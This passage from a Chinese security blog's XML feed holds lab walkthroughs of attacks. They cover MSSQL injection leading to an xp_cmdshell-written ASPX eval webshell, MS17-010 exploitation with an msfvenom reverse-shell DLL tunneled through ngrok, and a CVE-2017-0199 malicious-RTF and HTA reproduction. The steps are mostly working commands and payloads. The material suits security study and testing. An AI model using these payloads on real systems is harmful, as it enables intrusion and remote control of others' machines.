alt="Java代码删除文件"></p><p>大功告成。不过删除的时候要注意一下，删除错误的话可以去回收站查看，然后再恢复。不要急于清除回收站。<br>代码仅供参考。代码地址：<a href="http://fuping.site/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/BaiDuPan.rar">代码</a><br>Python的实现脚本<a href="https://github.com/fupinglee/MyPython/blob/master/baidu/BDPandel.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/baidu/BDPandel.py</a> 。<br>python代码删除文件效果图<br><img src="python%E4%BB%A3%E7%A0%81%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6.gif" alt="python代码删除文件"></p><p>还有一种最快的实现方法就是开个会员o(╯□╰)o。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>本文没有什么大的知识点，都是常用的内容拼接在了一起。主要用到了三方面的内容：<br>1.如何模拟网络请求抓取数据。这里采用了Java代码，Http请求采用了Jsoup。<br>2.JSON解析，使用了FastJSON来实现<br>3.递归遍历的实现</p><p>Python的实现也就是请求Http和数据库的操作。使用Python时要多注意数据类型和编码的转换。</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 百度网盘 </tag>
            
            <tag> 快速清除 </tag>
            
            <tag> Java代码 </tag>
            
            <tag> Python脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL DBA权限获取WEBSHELL的过程</title>
      <link href="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/"/>
      <url>/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文主要通过一个案例来演示一下当MSSQL是DBA权限，且不知道路径的时候如何去获取WEBSHELL。当然这种方式对站库分离的无效。<br>我测试的环境是在Win7 64位下，数据库是SQLServer 2000，IIS版本是7.5，程序是采用风讯的CMS。后台登录后有多处注入，因为这里是演示用注入获取WEBSHELL，因此就不考虑后台上传的情况了，只是用注入来实现。</p><a id="more"></a><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先找到一个如下的注入点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">' and 1=user;--</span></span><br></pre></td></tr></table></figure><p><img src="%E6%B3%A8%E5%85%A5%E7%82%B9.png" alt="注入点"></p><p>通过SQLMAP可以查看到是DBA权限</p><p><img src="DBA%E6%9D%83%E9%99%90.png" alt="DBA权限"></p><p>创建临时表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';CREATE TABLE tt_tmp (tmp1 varchar(8000));--</span></span><br></pre></td></tr></table></figure><p><img src="%E5%88%9B%E5%BB%BA%E4%B8%B4%E6%97%B6%E8%A1%A8.png" alt="创建临时表"></p><p>在WINDOWS下查找文件用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r 目录名:\ %i <span class="keyword">in</span> (匹配模式) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure><p>例如在C盘下搜索NewsList.aspx，可以使用<code>for /r c:\ %i in (Newslist*.aspx) do @echo %i</code>或者<code>for /r c:\ %i in (Newslist.aspx*) do @echo %i</code></p><p>使用<code>for /r c:\ %i in (Newslist*.aspx) do @echo %i</code>的搜索结果<br><img src="%E6%AD%A3%E7%A1%AE%E7%9A%84%E6%90%9C%E7%B4%A2%E6%96%B9%E5%BC%8F.png" alt="正确的搜索方式"></p><p>一定要在匹配模式里面加上一个*号，不然搜索出来的是全部的目录，后面拼接了你搜索的内容。<br>使用<code>for /r c:\ %i in (Newslist.aspx) do @echo %i</code>的搜索结果</p><p><img src="%E9%94%99%E8%AF%AF%E7%9A%84%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C.png" alt="错误的搜索结果"></p><p>用xp_cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';insert into tt_tmp(tmp1) exec master..xp_cmdshell '</span><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist*.aspx) <span class="keyword">do</span> @<span class="built_in">echo</span> %i <span class="string">';--</span></span><br></pre></td></tr></table></figure><p>如果无法执行xp_cmdshell，并提示如下错误<code>SQL Server阻止了对组件‘xp_cmdshell’的过程‘sys.xp_cmdshell’的访问。因为此组件已作为此服务嚣安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用‘xp_cmdshell’。</code></p><p><img src="%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8Cxp_cmdshell.png" alt="无法执行xp_cmdshell"></p><p>可以使用如下命令来启用xp_cmdshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure <span class="string">'show advanced options'</span>,1;//允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">'xp_cmdshell'</span>,1;  //打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;--</span><br></pre></td></tr></table></figure><p>然后再次执行搜索命令。</p><p><img src="%E6%89%A7%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%B9%B6%E7%BB%93%E6%9E%9C%E6%8F%92%E5%85%A5%E5%88%B0%E4%B8%B4%E6%97%B6%E8%A1%A8.png" alt="执行搜索并结果插入到临时表"></p><blockquote><p>在执行上述搜索和插入过程后，可以使用<code>&#39; and (select(*) from tt_tmp)&gt;1</code>页面返回是否正常来判断是否有搜索结果。当没有找到的话，<code>select(*) from tt_tmp</code>的结果为1，否则大于1。如果没有的话，就换目录，可以试试其他盘符，如<code>&#39;;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;for /r d:\ %i in (Newslist*.aspx) do @echo %i &#39;;--</code>。也可以使用sqlmap来查看条数。</p></blockquote><p>可以用报错将表内容给显示出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2<span class="string">' and 1=(select top 1 tmp1 from tt_tmp)and '</span>a<span class="string">'='</span>a</span><br></pre></td></tr></table></figure><p><img src="%E6%8A%A5%E9%94%99%E8%AF%BB%E5%87%BA1.png" alt="报错读出1"></p><p>继续爆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2<span class="string">' and 1=(select top 1 tmp1 from tt_tmp where tmp1 not in ('</span>c:\inetpub\wwwroot\manage\news\NewsList.aspx <span class="string">'))and '</span>a<span class="string">'='</span>a</span><br></pre></td></tr></table></figure><p><img src="%E6%8A%A5%E9%94%99%E8%AF%BB%E5%87%BA2.png" alt="报错读出2"></p><p>也可以用sqlmap直接将表中数据读取出来</p><p><img src="%E5%AF%BC%E5%87%BA%E4%B8%B4%E6%97%B6%E8%A1%A8.png" alt="导出临时表"></p><p>然后根据导出结果的路径来判断是否可能为WEB目录。然后写入一个测试文件，看是否可以访问来进一步证实结果。</p><p>这里在根目录写了一个txt文件，写别的目录怕因为没有权限而无法访问。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';exec master..xp_cmdshell '</span><span class="built_in">echo</span> <span class="built_in">test</span> &gt;c:\\WWW\\2333.txt<span class="string">';--</span></span><br></pre></td></tr></table></figure><p>然后访问<a href="http://192.168.232.138:81/2333.txt" target="_blank" rel="noopener">http://192.168.232.138:81/2333.txt</a></p><p><img src="%E6%9F%A5%E7%9C%8B%E5%86%99%E5%85%A5%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6.png" alt="查看写入的测试文件"></p><p>成功访问，然后就是写一句话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';exec master..xp_cmdshell '</span><span class="built_in">echo</span> ^&lt;%@ Page Language=<span class="string">"Jscript"</span>%^&gt;^&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%^&gt; &gt; c:\\WWW\\233.aspx<span class="string">' ;--</span></span><br></pre></td></tr></table></figure><p>成功写入。然后就是进一步的操作了，这里就不概述了。<br><img src="%E6%9F%A5%E7%9C%8B%E4%B8%80%E5%8F%A5%E8%AF%9D.png" alt="查看一句话"></p><blockquote><p>DOS命令将文件写入文本中时，遇到<code>&lt;&gt;</code>应在前面加上<code>^</code>。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里一共有三个小的知识点:<br>1.sa用户如何开启xp_cmdshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure <span class="string">'show advanced options'</span>,1;//允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">'xp_cmdshell'</span>,1;  //打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>2.Windows下利用dos如何搜索文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist*.aspx) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist.aspx*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure><p>3.dos命令下写文件遇到<code>&lt;&gt;</code>如何处理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;^&gt; &gt; 123.txt</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="http://blog.csdn.net/cashey1991/article/details/44993403" target="_blank" rel="noopener">Windows命令行(cmd)下快速查找文件(类似Linux下find命令) </a><br>[2]<a href="http://www.freebuf.com/articles/web/55577.html" target="_blank" rel="noopener">技术分享：MSSQL注入xp_cmdshell</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSSQL </tag>
            
            <tag> WEBSHELL </tag>
            
            <tag> ASPX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS17-010漏洞检测与内网穿透技术的应用</title>
      <link href="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/"/>
      <url>/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>本文主要介绍一下MSF模块的下载、使用，以及当攻击机处于内网，而目标机也处于内网的解决方法。这里借助MS17-010漏洞来具体讲解一下，并没有新的知识点，可以为刚入门的新手抛砖引玉，提供一条解决问题的思路，同时也记录一下过程，加强记忆。<br>主要分为两个知识点，一是SMB漏洞的批量检测，二是内网穿透技术。</p><a id="more"></a><p>首先是环境的搭建，具体如下表所示：</p><p>| 主机 | IP |备注|<br>|——–|——–|<br>|     Kali 64位   |   192.168.232.134     |攻击机<br>|     Windows XP 32位   |   192.168.232.128     |安装了python2.6，下载有方程式利用工具包（主要为Windows目录下的工具）<br>|     Window2008 R2 64位   |  10.50.2.62     |靶机，存在MS17-010漏洞，并可以访问外网</p><h3 id="0x01-SMB漏洞批量检测"><a href="#0x01-SMB漏洞批量检测" class="headerlink" title="0x01 SMB漏洞批量检测"></a>0x01 SMB漏洞批量检测</h3><h4 id="1-扫描脚本的下载和加载"><a href="#1-扫描脚本的下载和加载" class="headerlink" title="1.扫描脚本的下载和加载"></a>1.扫描脚本的下载和加载</h4><p>由于Metasploit还没有更新MS17-010检测的模块，所以要去exploit-db下载，并在MSF中加载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smb</span></span><br><span class="line">root@kali:/usr/share/metasploit-framework/modules/auxiliary/scanner/smb<span class="comment"># wget https://www.exploit-db.com/download/41891 -O smb_ms_17_010.rb</span></span><br></pre></td></tr></table></figure><p><img src="%E4%B8%8B%E8%BD%BD%E8%84%9A%E6%9C%AC.png" alt="下载脚本"></p><p>启动Metasploit，模块会自动加载，或者使用命令<code>reload_all</code>重新加载所有模块。</p><h4 id="2-漏洞扫描的使用方法"><a href="#2-漏洞扫描的使用方法" class="headerlink" title="2.漏洞扫描的使用方法"></a>2.漏洞扫描的使用方法</h4><p>选择使用smb_ms_17_010模块，并查看使用命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_ms_17_010</span><br><span class="line">msf auxiliary(smb_ms_17_010) &gt; show options</span><br></pre></td></tr></table></figure><p><img src="%E8%84%9A%E6%9C%AC%E8%AF%B4%E6%98%8E.png" alt="脚本说明"></p><p>所必须的参数有三个，对于无需登录的SMB，我们只需设置一下扫描的IP段、线程并运行即可开始扫描。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(smb_ms_17_010) &gt; <span class="built_in">set</span> RHOSTS 10.50.2.1-255</span><br><span class="line">RHOSTS =&gt; 10.50.2.1-255</span><br><span class="line">msf auxiliary(smb_ms_17_010) &gt; <span class="built_in">set</span> THREADS 10</span><br><span class="line">THREADS =&gt; 10</span><br><span class="line">msf auxiliary(smb_ms_17_010) &gt; run</span><br></pre></td></tr></table></figure><p><img src="%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" alt="扫描结果"></p><p>出现黄色警告的表示可能存在，需要进一步验证。<br>为了方便将存在漏洞的IP列出来，写了一个简单的Python脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">"smb.txt"</span>, mode=<span class="string">'r'</span>, buffering=1)</span><br><span class="line">    <span class="keyword">while</span>(True):</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line :</span><br><span class="line">                <span class="keyword">if</span>  <span class="string">"likely"</span> <span class="keyword">in</span> line:</span><br><span class="line">                    <span class="built_in">print</span> line.split(<span class="string">' '</span>)[1].split(<span class="string">':'</span>)[0]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">break</span></span><br></pre></td></tr></table></figure><p>提取出的IP如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line">10.50.2.52</span><br><span class="line">10.50.2.62</span><br><span class="line">10.50.2.65</span><br><span class="line">10.50.2.61</span><br><span class="line">10.50.2.63</span><br><span class="line">10.50.2.64</span><br><span class="line">10.50.2.76</span><br><span class="line">10.50.2.69</span><br><span class="line">10.50.2.77</span><br><span class="line">10.50.2.78</span><br><span class="line">10.50.2.79</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>有了存在漏洞的地址，接下来将开始对其进行验证，以10.50.2.62为例。<br>由于Kali在虚拟机，宿主机IP为2.0.<em>.</em>，目标机在10.50.2.*。相当于需要从内网到另一个内网， 选择采用了ngrok进行tcp的端口转发来实现内网的穿透。</p><h3 id="0x02-内网穿透"><a href="#0x02-内网穿透" class="headerlink" title="0x02 内网穿透"></a>0x02 内网穿透</h3><p>这里采用了<a href="http://www.ngrok.cc平台进行演示，类似这样的平台有很多，例如natapp.cn等。" target="_blank" rel="noopener">www.ngrok.cc平台进行演示，类似这样的平台有很多，例如natapp.cn等。</a><br>注册并开通隧道，如图所示。</p><p><img src="%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8B%E5%BC%80%E9%80%9A%E9%9A%A7%E9%81%93.png" alt="内网穿透之开通隧道"></p><p>下载对应的客户端，下载地址为：<a href="https://www.ngrok.cc/#down-client" target="_blank" rel="noopener">https://www.ngrok.cc/#down-client</a> ，选择与系统对应的软件。<br>我这里Kali为64位的，下载和使用命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># wget hls.ctopus.com/sunny/linux_amd64.zip</span></span><br><span class="line">root@kali:~/Downloads<span class="comment"># unzip  linux_amd64.zip</span></span><br><span class="line">root@kali:~/Downloads<span class="comment"># cd linux_amd64/</span></span><br><span class="line">root@kali:~/Downloads/linux_amd64<span class="comment"># ls</span></span><br><span class="line">root@kali:~/Downloads/linux_amd64<span class="comment"># ./sunny clientid 隧道ID</span></span><br></pre></td></tr></table></figure><p><img src="%E5%90%AF%E5%8A%A8ngrok.png" alt="启动ngrok"><br>出现下图的界面表示运行成功。<br><img src="ngrok%E5%90%AF%E5%8A%A8%E6%88%90%E5%8A%9F.png" alt="ngrok启动成功"></p><p>使用如下命令生成用于监听的dll文件。监听的IP为server.ngrok.cc的地址，端口为开通隧道时填写的远程端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents<span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.90.92.56  LPORT=6266 -f dll &gt; got.dll</span></span><br></pre></td></tr></table></figure><p><img src="%E7%94%9F%E6%88%90%E7%9B%91%E5%90%ACdll%E6%96%87%E4%BB%B6.png" alt="生成监听dll文件"></p><p>然后在Kali上设置监听本机的IP和端口，也就是在开通隧道时填写的本地端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.232.134</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="%E7%9B%91%E5%90%AC.png" alt="监听"></p><p>由于关于Eternalblue利用方法有很多教程了，这里就不详细说明了，如图所示。<br><img src="%E8%AE%BE%E7%BD%AE%E8%BF%87%E7%A8%8B.png" alt="设置过程"><br><img src="%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F.png" alt="利用成功"><br>攻击成功时查看ngrok客户端发现有一个连接。<br><img src="ngrok%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt="ngrok连接成功"><br>而且Kali上也生成了一个meterpreter会话。<br><img src="%E8%BF%94%E5%9B%9Emeterpreter%E4%BC%9A%E8%AF%9D.png" alt="返回meterpreter会话"><br>之后的操作就很简单了，可以添加用户等等。<br>最后远程登录成功如下图所示。<br><img src="%E9%9D%B6%E6%9C%BA%E6%88%90%E5%8A%9F.png" alt="靶机成功"><br>使用natapp也是可以的。<br><img src="natapp%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt="natapp连接成功"></p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>本文主要以MS17-010为例，讲解了如何下载和利用Metasploit中没有的模块，以及如何解决内网到内网的穿透的问题，当然解决的方法还有很多，这里就不再介绍了。</p><blockquote><p>没有什么新的知识，怕忘记所以记录一下~~</p></blockquote><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><p>[1]<a href="https://www.exploit-db.com/exploits/41891/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41891/</a><br>[2]<a href="http://bobao.360.cn/learning/detail/3041.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3041.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MS17-010 </tag>
            
            <tag> Metasploit </tag>
            
            <tag> Ngrok </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-0199漏洞复现过程</title>
      <link href="/2017/04/18/CVE-2017-0199%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
      <url>/2017/04/18/CVE-2017-0199%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>记录一下过程，周日已经出了结果，但是过程忘记了，抽空再次实现了一下。结尾附上利用MSF生成exploit（外国黑客城会玩）。</p></blockquote><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>一台apache服务器（这里我用Kali）、POC和一个Word文档。<br>POC内容大概如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">a=new ActiveXObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line">a.run(<span class="string">'%windir%\\System32\\cmd.exe /c calc.exe'</span>, 0);window.close();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><a id="more"></a><p>Word文档内容任意。<br><img src="Word%E6%96%87%E6%A1%A3%E5%86%85%E5%AE%B9.png" alt="Word文档内容"></p><p>然后将其放在Kali服务器上<br>Apache需要开启DAV支持，具体命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a2enmod dav  </span><br><span class="line">a2enmod dav_fs  </span><br><span class="line">a2enmod dav_lock  </span><br><span class="line">a2enmod headers</span><br></pre></td></tr></table></figure><p><img src="apache%E9%85%8D%E7%BD%AE.png" alt="apache配置"></p><h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><p>在web目录新建ms文件夹，将test.docx复制到ms目录下，并重命名为test.rtf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~/Documents<span class="comment"># cp test.docx /var/www/html/ms/test.rtf</span></span><br></pre></td></tr></table></figure><p>新建Word文档，插入对象<br>如图<br><img src="%E6%96%B0%E5%BB%BAexploit%E6%96%87%E6%A1%A3.png" alt="新建exploit文档"></p><p>并保存为rtf文件，如233.rtf<br>删除服务器上的test.rtf文件<br>并将poc.hta文件复制到ms目录下，并改名为test.rtf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/var/www/html/ms<span class="comment"># rm -rf test.rtf </span></span><br><span class="line">root@kali:~/Documents<span class="comment"># cp poc.hta  /var/www/html/ms/test.rtf</span></span><br></pre></td></tr></table></figure><p>修改Apache配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /&gt;  </span><br><span class="line">Dav on  </span><br><span class="line">&lt;/Directory&gt;  </span><br><span class="line"></span><br><span class="line"> &lt;Directory /var/www/html/ms/&gt;  </span><br><span class="line">Header <span class="built_in">set</span> Content-Type <span class="string">"application/hta"</span>  </span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p><img src="%E4%BF%AE%E6%94%B9Apache%E9%85%8D%E7%BD%AE.png" alt="修改Apache配置"></p><p>并重启服务器<code>service apache2 restart</code></p><p>打开233.rtf文档</p><p>双击word文档的文字，将会有惊喜弹出</p><p><img src="%E8%AE%A1%E7%AE%97%E5%99%A8%E5%BC%B9%E5%87%BA.png" alt="计算器弹出"></p><p>打开文档就弹出的话需要将<code>\object\objautlink\rsltpict</code>修改为<br><code>\object\objautlink\objupdate\rsltpict</code><br><img src="%E4%BF%AE%E6%94%B9%E5%AF%B9%E6%AF%94.png" alt="修改对比"></p><p>再次打开文件</p><p><img src="%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B.gif" alt="执行过程"></p><h3 id="彩蛋（MSF下的实现）"><a href="#彩蛋（MSF下的实现）" class="headerlink" title="彩蛋（MSF下的实现）"></a>彩蛋（MSF下的实现）</h3><p>在kali下执行。<br>首先更新msf到最新。（假设你们都完成了这个过程）</p><h4 id="下载利用脚本"><a href="#下载利用脚本" class="headerlink" title="下载利用脚本"></a>下载利用脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/windows/fileformat<span class="comment"># wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/modules/exploits/windows/fileformat/office_word_hta.rb</span></span><br></pre></td></tr></table></figure><p>然后msf下执行命令<code>reload_all</code>重新加载模块</p><p><img src="%E4%B8%8B%E8%BD%BD%E5%B9%B6%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC.png" alt="下载并加载脚本"></p><p>下载rtf文件到<code>/usr/share/metasploit-framework/data/exploits</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/metasploit-framework/data/exploits</span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/data/exploits/cve-2017-0199.rtf</span><br></pre></td></tr></table></figure><h4 id="开启hta服务"><a href="#开启hta服务" class="headerlink" title="开启hta服务"></a>开启hta服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/misc/hta_server</span><br><span class="line">msf exploit(hta_server) &gt; show options</span><br><span class="line">msf exploit(hta_server) &gt; run</span><br></pre></td></tr></table></figure><p><img src="%E5%BC%80%E5%90%AFhta%E6%9C%8D%E5%8A%A1.png" alt="开启hta服务"></p><h4 id="生成exploit文档"><a href="#生成exploit文档" class="headerlink" title="生成exploit文档"></a>生成exploit文档</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(hta_server) &gt; use exploit/windows/fileformat/office_word_hta</span><br><span class="line">msf exploit(office_word_hta) &gt; show options</span><br><span class="line">msf exploit(office_word_hta) &gt; <span class="built_in">set</span> TARGETURI http://192.168.232.134:8080/4Jmy4cmcZZV7pwi.hta</span><br><span class="line">msf exploit(office_word_hta) &gt; <span class="built_in">set</span> FILENAME msf.doc</span><br><span class="line">msf exploit(office_word_hta) &gt; run</span><br></pre></td></tr></table></figure><p><img src="%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F%E6%96%87%E6%A1%A3.png" alt="生成恶意文档"></p><p>将生成的msf.doc文件复制到windows上，打开即可获取一个会话</p><p>如下所示</p><h5 id="WIndows下结果"><a href="#WIndows下结果" class="headerlink" title="WIndows下结果"></a>WIndows下结果</h5><p><img src="Windows%E4%B8%8A%E6%89%93%E5%BC%80%E7%BB%93%E6%9E%9C.png" alt="Windows上打开结果"></p><h5 